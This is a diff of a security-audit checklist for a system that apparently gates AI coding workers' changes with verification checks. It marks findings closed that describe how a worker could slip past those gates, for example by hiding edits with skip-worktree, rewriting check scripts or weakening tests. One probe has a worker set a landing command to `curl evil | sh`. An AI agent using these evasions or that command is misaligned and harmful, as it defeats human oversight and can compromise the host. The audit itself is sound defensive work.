@@ -27,9 +27,9 @@ Ground truth first: `./ci.sh` in full (427 tests, none skipped, exit 0), the pac
   `packages/opencode/package.json:35` — node -e 'require("./packages/opencode/package.json").scripts.test' lists test/unit, core, modes, flow, dist, plugin, fleet-fixes, horde (8 files); the directory holds 10 … → [00-live.md](./00-live.md#live-03--)
 - [ ] **GAT-01** [high] Land-stage gate reads the worktree's on-disk horde.json, so a worker's rewritten checks judge what lands
   `packages/verify/src/gate.ts:290` — gate.ts:290 `const settings = base && opts.settingsFrom !== "working" ? await loadSettingsAt(dir, opts.rulesAt ?? base) : loadSettings(dir)`; fleet.ts:1692-1700 landLoop … → [02-gates.md](./02-gates.md#gat-01--)
-- [ ] **GAT-02** [high] `git update-index --skip-worktree` hides any edit (horde.json, package.json, tests) from every audit path
+- [x] **GAT-02** (closed 7995364) [high] `git update-index --skip-worktree` hides any edit (horde.json, package.json, tests) from every audit path
   `packages/verify/src/audit.ts:271` — audit.ts:271-339 changes() builds the change list from `git diff --name-status`, `git diff -U0` and `git ls-files --others --exclude-standard`; all three honour the skip-… → [02-gates.md](./02-gates.md#gat-02--)
-- [ ] **GAT-03** [high] Check scripts outside package.json are not rule-guarded: Makefile targets and shell scripts a check runs can be rewritten freely
+- [x] **GAT-03** (closed 7995364) [high] Check scripts outside package.json are not rule-guarded: Makefile targets and shell scripts a check runs can be rewritten freely
   `packages/verify/src/audit.ts:518` — ruleChanges (audit.ts:518-594) watches horde.json verify, package.json scripts (+pre/post hooks), RUNNER_CONFIG, conftest.py, CHECK_CONFIG, pyproject/setup.cfg sections o… → [02-gates.md](./02-gates.md#gat-03--)
 - [x] **SEC-01** (closed 919927a) [high] Workers get an unconfined shell that OpenCode never prompts for by default, and the plugin's user-facing docs do not say so
   `packages/opencode/src/fleet.ts:369` — fleet.ts:363-371 withScope(): the task scope becomes OpenCode `edit` rules only ({"*": outside ?? "deny", <scope>: "allow"}); no `shell` rule is ever added (profileRules … → [05-security.md](./05-security.md#sec-01--)
@@ -66,19 +66,19 @@ Ground truth first: `./ci.sh` in full (427 tests, none skipped, exit 0), the pac
   `scripts/bundle-plugin.mjs:62` — scripts/bundle-plugin.mjs:62-74: builds into a tmp dir and reports `stale` = files of the tmp build that are missing or byte-different in plugins/horde/servers; it never … → [01-deploy.md](./01-deploy.md#dep-09--)
 - [x] **DEP-10** (closed 9bfba96) [low] plugin.json and the marketplace entry carry no version: validator warns, clone installs show 0.1.0 forever
   `plugins/horde/.claude-plugin/plugin.json:1` — `claude plugin validate .` → "plugins[0] plugin.json → version: No version specified" (and ICON_MISSING for the plugin directory); `claude plugin validate plugins/horde` … → [01-deploy.md](./01-deploy.md#dep-10--)
-- [ ] **GAT-04** [medium] horde.json changes outside `verify` (workers.land, workers.setup, tiers, context) are not audited, yet the orchestrator executes them after landing
+- [x] **GAT-04** (closed 7995364) [medium] horde.json changes outside `verify` (workers.land, workers.setup, tiers, context) are not audited, yet the orchestrator executes them after landing
   `packages/verify/src/audit.ts:562` — audit.ts:562-563 compares only `json(before).verify` with `json(after).verify`. Probe audit-probes.mts case 33: worker sets workers.land to `curl evil | sh` and workers.s… → [02-gates.md](./02-gates.md#gat-04--)
 - [ ] **GAT-05** [medium] A task started from a repository subdirectory is gated on different checks at land than in its rounds (none when the checks live only in the subdirectory)
   `packages/opencode/src/fleet.ts:1692` — runGateFor gates `live.session?.location.directory ?? live.record.directory` (= worktree.path, fleet.ts:2152) while landLoop gates `wt.root` (fleet.ts:1692); detectChecks… → [02-gates.md](./02-gates.md#gat-05--)
-- [ ] **GAT-06** [medium] Assertion removal and snapshot rewrites only warn (never block), and a snapshot rewrite of 20 lines or fewer is silent
+- [x] **GAT-06** (closed 7995364) [medium] Assertion removal and snapshot rewrites only warn (never block), and a snapshot rewrite of 20 lines or fewer is silent
   `packages/verify/src/audit.ts:674` — audit.ts:674 `add("tests", {... removes N assertions}, true)` and :675-676 snapshot `... c.removed.length > 20 ... , true)`: the `soft` flag forces severity warn whatever… → [02-gates.md](./02-gates.md#gat-06--)
-- [ ] **GAT-07** [medium] Verdict cache ignores git-ignored inputs: a changed .env or linked dependency leaves a cached PASS
+- [x] **GAT-07** (closed 494e12d) [medium] Verdict cache ignores git-ignored inputs: a changed .env or linked dependency leaves a cached PASS
   `packages/verify/src/gate.ts:86` — treeKey (gate.ts:81-95) hashes HEAD, `git diff --binary HEAD` and `ls-files --others --exclude-standard` (ignored files excluded) plus the options. Probe gate-probes2.mts… → [02-gates.md](./02-gates.md#gat-07--)
 - [ ] **GAT-08** [low] A check that rewrites a tracked file makes later checks judge a tree that is not the one that lands
   `packages/opencode/src/fleet.ts:1713` — landLoop fast-forwards `judged` (the commit before the checks ran, fleet.ts:1713) while checks run sequentially in the working tree (run.ts:71-74). Probe gate-probes.mts … → [02-gates.md](./02-gates.md#gat-08--)
-- [ ] **GAT-09** [low] Untracked artefacts of the worker's own test runs (e.g. __pycache__ in a repo whose .gitignore lacks it) block the gate as binaries
+- [x] **GAT-09** (closed 494e12d) [low] Untracked artefacts of the worker's own test runs (e.g. __pycache__ in a repo whose .gitignore lacks it) block the gate as binaries
   `packages/verify/src/gate.ts:326` — gate.ts:324-326 drops only files that first appear during the gate's own run. Probe gate-probes.mts section A (pytest project without .gitignore): the first gate's pytest… → [02-gates.md](./02-gates.md#gat-09--)
-- [ ] **GAT-10** [low] Checks inherit provider API keys; only OPENCODE_SERVER_* and HORDE_* are stripped
+- [x] **GAT-10** (closed 494e12d) [low] Checks inherit provider API keys; only OPENCODE_SERVER_* and HORDE_* are stripped
   `packages/verify/src/run.ts:54` — run.ts:54 `STRIP_ENV = ["FORCE_COLOR", "CLICOLOR_FORCE", "NODE_TEST_CONTEXT", "OPENCODE_SERVER_", "HORDE_"]`. Probe gate-probes.mts section C (check = `env | grep ...`): … → [02-gates.md](./02-gates.md#gat-10--)
 - [ ] **GAT-11** [low] horde.json workers.land/setup are read from the main checkout's working file, not from the branch tip
   `packages/opencode/src/fleet.ts:1666` — fleet.ts:1666 `const land = loadWorkers(wt.repo).land` and :1100 `loadWorkers(directory)` → core config.ts:203 loadWorkers → loadHordeFile reads the file on disk; worktre… → [02-gates.md](./02-gates.md#gat-11--)
